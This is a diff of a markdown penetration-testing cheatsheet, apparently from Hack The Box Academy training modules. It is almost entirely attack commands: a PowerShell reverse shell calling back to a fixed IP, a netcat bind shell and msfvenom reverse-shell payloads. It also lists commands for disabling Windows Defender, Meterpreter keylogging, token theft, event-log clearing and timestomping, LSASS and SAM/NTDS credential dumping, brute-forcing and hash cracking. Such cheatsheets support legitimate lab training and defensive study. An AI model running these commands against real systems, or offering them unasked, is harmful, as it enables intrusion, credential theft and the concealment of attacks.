@@ -604,74 +604,41 @@ By leveraging the Wayback Machine, you can gain a historical perspective on your
 | `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                           | Download a file using SCP                   |
 | `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
 
-## Fuzzing with Ffuf
-
-|**Command**|**Description**|
-|---|---|
-|`ffuf -h`|ffuf help|
-|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`|Directory Fuzzing|
-|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`|Extension Fuzzing|
-|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`|Page Fuzzing|
-|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`|Recursive Fuzzing|
-|`ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/`|Sub-domain Fuzzing|
-|`ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`|VHost Fuzzing|
-|`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`|Parameter Fuzzing - GET|
-|`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`|Parameter Fuzzing - POST|
-|`ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`|Value Fuzzing|
-
-### Wordlists
-
-|**Command**|**Description**|
-|---|---|
-|`/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt`|Directory/Page Wordlist|
-|`/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt`|Extensions Wordlist|
-|`/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`|Domain Wordlist|
-|`/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`|Parameters Wordlist|
-
-### Misc
-
-|**Command**|**Description**|
-|---|---|
-|`sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'`|Add DNS entry|
-|`for i in $(seq 1 1000); do echo $i >> ids.txt; done`|Create Sequence Wordlist|
-|`curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'`|curl w/ POST|
-
-
 ## Shells & Payloads
 
-|**Commands**|**Description**|
-|---|---|
-|`xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!`|CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol|
-|`env`|Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use|
-|`sudo nc -lvnp <port #>`|Starts a `netcat` listener on a specified port|
-|`nc -nv <ip address of computer with listener started><port being listened on>`|Connects to a netcat listener at the specified IP address and port|
-|`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f`|Uses netcat to bind a shell (`/bin/bash`) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on|
-|`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`|`Powershell` one-liner used to connect back to a listener that has been started on an attack box|
-|`Set-MpPreference -DisableRealtimeMonitoring $true`|Powershell command using to disable real time monitoring in `Windows Defender`|
-|`use exploit/windows/smb/psexec`|Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec`|
-|`shell`|Command used in a meterpreter shell session to drop into a `system shell`|
-|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`|`MSFvenom` command used to generate a linux-based reverse shell `stageless payload`|
-|`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`|MSFvenom command used to generate a Windows-based reverse shell stageless payload|
-|`msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`|MSFvenom command used to generate a MacOS-based reverse shell payload|
-|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp`|MSFvenom command used to generate a ASP web reverse shell payload|
-|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`|MSFvenom command used to generate a JSP web reverse shell payload|
-|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`|MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload|
-|`use auxiliary/scanner/smb/smb_ms17_010`|Metasploit exploit module used to check if a host is vulnerable to `ms17_010`|
-|`use exploit/windows/smb/ms17_010_psexec`|Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010|
-|`use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`|Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting `rConfig 3.9.6`|
-|`python -c 'import pty; pty.spawn("/bin/sh")'`|Python command used to spawn an `interactive shell` on a linux-based system|
-|`/bin/sh -i`|Spawns an interactive shell on a linux-based system|
-|`perl —e 'exec "/bin/sh";'`|Uses `perl` to spawn an interactive shell on a linux-based system|
-|`ruby: exec "/bin/sh"`|Uses `ruby` to spawn an interactive shell on a linux-based system|
-|`Lua: os.execute('/bin/sh')`|Uses `Lua` to spawn an interactive shell on a linux-based system|
-|`awk 'BEGIN {system("/bin/sh")}'`|Uses `awk` command to spawn an interactive shell on a linux-based system|
-|`find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`|Uses `find` command to spawn an interactive shell on a linux-based system|
-|`find . -exec /bin/sh \; -quit`|An alternative way to use the `find` command to spawn an interactive shell on a linux-based system|
-|`vim -c ':!/bin/sh'`|Uses the text-editor `VIM` to spawn an interactive shell. Can be used to escape "jail-shells"|
-|`ls -la <path/to/fileorbinary>`|Used to `list` files & directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute|
-|`sudo -l`|Displays the commands that the currently logged on user can run as `sudo`|
-|`/usr/share/webshells/laudanum`|Location of `laudanum webshells` on ParrotOS and Pwnbox|
-|`/usr/share/nishang/Antak-WebShell`|Location of `Antak-Webshell` on Parrot OS and Pwnbox|
+| **Commands**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | **Description**                                                                                                                                                                                         |
+| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol                                                                                                                    |
+| `env`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use                             |
+| `sudo nc -lvnp <port #>`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Starts a `netcat` listener on a specified port                                                                                                                                                          |
+| `nc -nv <ip address of computer with listener started><port being listened on>`                                                                                                                                                                                                                                                                                                                                                                                                                                                               | Connects to a netcat listener at the specified IP address and port                                                                                                                                      |
+| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f`                                                                                                                                                                                                                                                                                                                                                                                                                                           | Uses netcat to bind a shell (`/bin/bash`) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on |
+| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | `Powershell` one-liner used to connect back to a listener that has been started on an attack box                                                                                                        |
+| `Set-MpPreference -DisableRealtimeMonitoring $true`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Powershell command using to disable real time monitoring in `Windows Defender`                                                                                                                          |
+| `use exploit/windows/smb/psexec`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec`                                                                         |
+| `shell`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | Command used in a meterpreter shell session to drop into a `system shell`                                                                                                                               |
+| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`                                                                                                                                                                                                                                                                                                                                                                                                                                                | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload`                                                                                                                     |
+| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`                                                                                                                                                                                                                                                                                                                                                                                                                                                  | MSFvenom command used to generate a Windows-based reverse shell stageless payload                                                                                                                       |
+| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`                                                                                                                                                                                                                                                                                                                                                                                                                                              | MSFvenom command used to generate a MacOS-based reverse shell payload                                                                                                                                   |
+| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp`                                                                                                                                                                                                                                                                                                                                                                                                                                            | MSFvenom command used to generate a ASP web reverse shell payload                                                                                                                                       |
+| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`                                                                                                                                                                                                                                                                                                                                                                                                                                                 | MSFvenom command used to generate a JSP web reverse shell payload                                                                                                                                       |
+| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`                                                                                                                                                                                                                                                                                                                                                                                                                                                 | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload                                                                                                                   |
+| `use auxiliary/scanner/smb/smb_ms17_010`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Metasploit exploit module used to check if a host is vulnerable to `ms17_010`                                                                                                                           |
+| `use exploit/windows/smb/ms17_010_psexec`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010                                                                                 |
+| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting `rConfig 3.9.6`                                                                               |
+| `python -c 'import pty; pty.spawn("/bin/sh")'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | Python command used to spawn an `interactive shell` on a linux-based system                                                                                                                             |
+| `/bin/sh -i`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Spawns an interactive shell on a linux-based system                                                                                                                                                     |
+| `perl —e 'exec "/bin/sh";'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | Uses `perl` to spawn an interactive shell on a linux-based system                                                                                                                                       |
+| `ruby: exec "/bin/sh"`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | Uses `ruby` to spawn an interactive shell on a linux-based system                                                                                                                                       |
+| `Lua: os.execute('/bin/sh')`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Uses `Lua` to spawn an interactive shell on a linux-based system                                                                                                                                        |
+| `awk 'BEGIN {system("/bin/sh")}'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | Uses `awk` command to spawn an interactive shell on a linux-based system                                                                                                                                |
+| `find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | Uses `find` command to spawn an interactive shell on a linux-based system                                                                                                                               |
+| `find . -exec /bin/sh \; -quit`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | An alternative way to use the `find` command to spawn an interactive shell on a linux-based system                                                                                                      |
+| `vim -c ':!/bin/sh'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | Uses the text-editor `VIM` to spawn an interactive shell. Can be used to escape "jail-shells"                                                                                                           |
+| `ls -la <path/to/fileorbinary>`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | Used to `list` files & directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute          |
+| `sudo -l`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Displays the commands that the currently logged on user can run as `sudo`                                                                                                                               |
+| `/usr/share/webshells/laudanum`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | Location of `laudanum webshells` on ParrotOS and Pwnbox                                                                                                                                                 |
+| `/usr/share/nishang/Antak-WebShell`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Location of `Antak-Webshell` on Parrot OS and Pwnbox                                                                                                                                                    |
 
 [Download Cheatsheet](https://academy.hackthebox.com/module/cheatsheet/115)
 
@@ -721,50 +688,159 @@ By leveraging the Wayback Machine, you can gain a historical perspective on your
 
 ###  Meterpreter Commands
 
+| **Command**                                           | **Description**                                                                               |
+| :---------------------------------------------------- | :-------------------------------------------------------------------------------------------- |
+| `help`                                                | Open Meterpreter usage help.                                                                  |
+| `run <scriptname>`                                    | Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.       |
+| `sysinfo`                                             | Show the system information on the compromised target.                                        |
+| `ls`                                                  | List the files and folders on the target.                                                     |
+| `use priv`                                            | Load the privilege extension for extended Meterpreter libraries.                              |
+| `ps`                                                  | Show all running processes and which accounts are associated with each process.               |
+| `migrate <proc. id>`                                  | Migrate to the specific process ID (PID is the target process ID gained from the ps command). |
+| `use incognito`                                       | Load incognito functions. (Used for token stealing and impersonation on a target machine.)    |
+| `list_tokens -u`                                      | List available tokens on the target by user.                                                  |
+| `list_tokens -g`                                      | List available tokens on the target by group.                                                 |
+| `impersonate_token <DOMAIN_NAMEUSERNAME>`             | Impersonate a token available on the target.                                                  |
+| `steal_token <proc. id>`                              | Steal the tokens available for a given process and impersonate that token.                    |
+| `drop_token`                                          | Stop impersonating the current token.                                                         |
+| `getsystem`                                           | Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.        |
+| `shell`                                               | Drop into an interactive shell with all available tokens.                                     |
+| `execute -f <cmd.exe> -i`                             | Execute cmd.exe and interact with it.                                                         |
+| `execute -f <cmd.exe> -i -t`                          | Execute cmd.exe with all available tokens.                                                    |
+| `execute -f <cmd.exe> -i -H -t`                       | Execute cmd.exe with all available tokens and make it a hidden process.                       |
+| `rev2self`                                            | Revert back to the original user you used to compromise the target.                           |
+| `reg <command>`                                       | Interact, create, delete, query, set, and much more in the target’s registry.                 |
+| `setdesktop <number>`                                 | Switch to a different screen based on who is logged in.                                       |
+| `screenshot`                                          | Take a screenshot of the target’s screen.                                                     |
+| `upload <filename>`                                   | Upload a file to the target.                                                                  |
+| `download <filename>`                                 | Download a file from the target.                                                              |
+| `keyscan_start`                                       | Start sniffing keystrokes on the remote target.                                               |
+| `keyscan_dump`                                        | Dump the remote keys captured on the target.                                                  |
+| `keyscan_stop`                                        | Stop sniffing keystrokes on the remote target.                                                |
+| `getprivs`                                            | Get as many privileges as possible on the target.                                             |
+| `uictl enable <keyboard/mouse>`                       | Take control of the keyboard and/or mouse.                                                    |
+| `background`                                          | Run your current Meterpreter shell in the background.                                         |
+| `hashdump`                                            | Dump all hashes on the target. use sniffer Load the sniffer module.                           |
+| `sniffer_interfaces`                                  | List the available interfaces on the target.                                                  |
+| `sniffer_dump <interfaceID> pcapname`                 | Start sniffing on the remote target.                                                          |
+| `sniffer_start <interfaceID> packet-buffer`           | Start sniffing with a specific range for a packet buffer.                                     |
+| `sniffer_stats <interfaceID>`                         | Grab statistical information from the interface you are sniffing.                             |
+| `sniffer_stop <interfaceID>`                          | Stop the sniffer.                                                                             |
+| `add_user <username> <password> -h <ip>`              | Add a user on the remote target.                                                              |
+| `add_group_user <"Domain Admins"> <username> -h <ip>` | Add a username to the Domain Administrators group on the remote target.                       |
+| `clearev`                                             | Clear the event log on the target machine.                                                    |
+| `timestomp`                                           | Change file attributes, such as creation date (antiforensics measure).                        |
+| `reboot`                                              | Reboot the target machine.                                                                    |
+|                                                       |                                                                                               |
+
+
+## Password Attacks
+
+
+### Connecting to Target
+
 |**Command**|**Description**|
-|:--|:--|
-|`help`|Open Meterpreter usage help.|
-|`run <scriptname>`|Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.|
-|`sysinfo`|Show the system information on the compromised target.|
-|`ls`|List the files and folders on the target.|
-|`use priv`|Load the privilege extension for extended Meterpreter libraries.|
-|`ps`|Show all running processes and which accounts are associated with each process.|
-|`migrate <proc. id>`|Migrate to the specific process ID (PID is the target process ID gained from the ps command).|
-|`use incognito`|Load incognito functions. (Used for token stealing and impersonation on a target machine.)|
-|`list_tokens -u`|List available tokens on the target by user.|
-|`list_tokens -g`|List available tokens on the target by group.|
-|`impersonate_token <DOMAIN_NAMEUSERNAME>`|Impersonate a token available on the target.|
-|`steal_token <proc. id>`|Steal the tokens available for a given process and impersonate that token.|
-|`drop_token`|Stop impersonating the current token.|
-|`getsystem`|Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.|
-|`shell`|Drop into an interactive shell with all available tokens.|
-|`execute -f <cmd.exe> -i`|Execute cmd.exe and interact with it.|
-|`execute -f <cmd.exe> -i -t`|Execute cmd.exe with all available tokens.|
-|`execute -f <cmd.exe> -i -H -t`|Execute cmd.exe with all available tokens and make it a hidden process.|
-|`rev2self`|Revert back to the original user you used to compromise the target.|
-|`reg <command>`|Interact, create, delete, query, set, and much more in the target’s registry.|
-|`setdesktop <number>`|Switch to a different screen based on who is logged in.|
-|`screenshot`|Take a screenshot of the target’s screen.|
-|`upload <filename>`|Upload a file to the target.|
-|`download <filename>`|Download a file from the target.|
-|`keyscan_start`|Start sniffing keystrokes on the remote target.|
-|`keyscan_dump`|Dump the remote keys captured on the target.|
-|`keyscan_stop`|Stop sniffing keystrokes on the remote target.|
-|`getprivs`|Get as many privileges as possible on the target.|
-|`uictl enable <keyboard/mouse>`|Take control of the keyboard and/or mouse.|
-|`background`|Run your current Meterpreter shell in the background.|
-|`hashdump`|Dump all hashes on the target. use sniffer Load the sniffer module.|
-|`sniffer_interfaces`|List the available interfaces on the target.|
-|`sniffer_dump <interfaceID> pcapname`|Start sniffing on the remote target.|
-|`sniffer_start <interfaceID> packet-buffer`|Start sniffing with a specific range for a packet buffer.|
-|`sniffer_stats <interfaceID>`|Grab statistical information from the interface you are sniffing.|
-|`sniffer_stop <interfaceID>`|Stop the sniffer.|
-|`add_user <username> <password> -h <ip>`|Add a user on the remote target.|
-|`add_group_user <"Domain Admins"> <username> -h <ip>`|Add a username to the Domain Administrators group on the remote target.|
-|`clearev`|Clear the event log on the target machine.|
-|`timestomp`|Change file attributes, such as creation date (antiforensics measure).|
-|`reboot`|Reboot the target machine.|
-|||
+|---|---|
+|`xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!`|CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol.|
+|`evil-winrm -i <ip> -u user -p password`|Uses Evil-WinRM to establish a Powershell session with a target.|
+|`ssh user@<ip>`|Uses SSH to connect to a target using a specified user.|
+|`smbclient -U user \\\\<ip>\\SHARENAME`|Uses smbclient to connect to an SMB share using a specified user.|
+|`python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/`|Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.|
+
+---
+
+### Password Mutations
+
+|**Command**|**Description**|
+|---|---|
+|`cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`|Uses cewl to generate a wordlist based on keywords present on a website.|
+|`hashcat --force password.list -r custom.rule --stdout > mut_password.list`|Uses Hashcat to generate a rule-based word list.|
+|`./username-anarchy -i /path/to/listoffirstandlastnames.txt`|Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.|
+|`curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt`|Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords.|
+
+---
+
+### Remote Password Attacks
+
+|**Command**|**Description**|
+|---|---|
+|`crackmapexec winrm <ip> -u user.list -p password.list`|Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target.|
+|`crackmapexec smb <ip> -u "user" -p "password" --shares`|Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials.|
+|`hydra -L user.list -P password.list <service>://<ip>`|Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.|
+|`hydra -l username -P password.list <service>://<ip>`|Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service.|
+|`hydra -L user.list -p password <service>://<ip>`|Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service.|
+|`hydra -C <user_pass.list> ssh://<IP>`|Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.|
+|`crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam`|Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.|
+|`crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa`|Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.|
+|`crackmapexec smb <ip> -u <username> -p <password> --ntds`|Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network.|
+|`evil-winrm -i <ip> -u Administrator -H "<passwordhash>"`|Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of `Pass-The-Hash` attack.|
+
+---
+
+### Windows Local Password Attacks
+
+|**Command**|**Description**|
+|---|---|
+|`tasklist /svc`|A command-line-based utility in Windows used to list running processes.|
+|`findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`|Uses Windows command-line based utility findstr to search for the string "password" in many different file type.|
+|`Get-Process lsass`|A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.|
+|`rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`|Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.|
+|`pypykatz lsa minidump /path/to/lsassdumpfile`|Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.|
+|`reg.exe save hklm\sam C:\sam.save`|Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).|
+|`move sam.save \\<ip>\NameofFileShare`|Uses move in Windows to transfer a file to a specified file share over the network.|
+|`python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`|Uses Secretsdump.py to dump password hashes from the SAM database.|
+|`vssadmin CREATE SHADOW /For=C:`|Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely.|
+|`cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`|Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`.|
+
+---
+
+### Linux Local Password Attacks
+
+|**Command**|**Description**|
+|---|---|
+|`for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done`|Script that can be used to find .conf, .config and .cnf files on a Linux system.|
+|`for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done`|Script that can be used to find credentials in specified file types.|
+|`for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done`|Script that can be used to find common database files.|
+|`find /home/* -type f -name "*.txt" -o ! -name "*.*"`|Uses Linux-based find command to search for text files.|
+|`for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done`|Script that can be used to search for common file types used with scripts.|
+|`for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done`|Script used to look for common types of documents.|
+|`cat /etc/crontab`|Uses Linux-based cat command to view the contents of crontab in search for credentials.|
+|`ls -la /etc/cron.*/`|Uses Linux-based ls -la command to list all files that start with `cron` contained in the etc directory.|
+|`grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"`|Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys.|
+|`grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \| grep ":1"`|Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user's home directory.|
+|`grep -rnw "ssh-rsa" /home/* 2>/dev/null \| grep ":1"`|Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user's home directory.|
+|`tail -n5 /home/*/.bash*`|Uses Linux-based tail command to search the through bash history files and output the last 5 lines.|
+|`python3 mimipenguin.py`|Runs Mimipenguin.py using python3.|
+|`bash mimipenguin.sh`|Runs Mimipenguin.sh using bash.|
+|`python2.7 lazagne.py all`|Runs Lazagne.py with all modules using python2.7|
+|`ls -l .mozilla/firefox/ \| grep default`|Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep.|
+|`cat .mozilla/firefox/1bplpd86.default-release/logins.json \| jq .`|Uses Linux-based command cat to search for credentials stored by Firefox in JSON.|
+|`python3.9 firefox_decrypt.py`|Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.|
+|`python3 lazagne.py browsers`|Runs Lazagne.py browsers module using Python 3.|
+
+---
+
+### Cracking Passwords
+
+| **Command**                                                                                                  | **Description**                                                                                                                                |
+| ------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------- |
+| `hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt`                                          | Uses Hashcat to crack NTLM hashes using a specified wordlist.                                                                                  |
+| `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show`                   | Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.                                            |
+| `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`                                          | Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.                                      |
+| `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`                         | Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked. |
+| `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`                                                            | Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file.                                              |
+| `hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked` | Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked.        |
+| `python3 ssh2john.py SSH.private > ssh.hash`                                                                 | Runs ssh2john.py script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash.      |
+| `john ssh.hash --show`                                                                                       | Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal.                                       |
+| `office2john.py Protected.docx > protected-docx.hash`                                                        | Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.                      |
+| `john --wordlist=rockyou.txt protected-docx.hash`                                                            | Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash.                                                  |
+| `pdf2john.pl PDF.pdf > pdf.hash`                                                                             | Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked.                                                                      |
+| `john --wordlist=rockyou.txt pdf.hash`                                                                       | Runs John in conjunction with a wordlist to crack a pdf hash.                                                                                  |
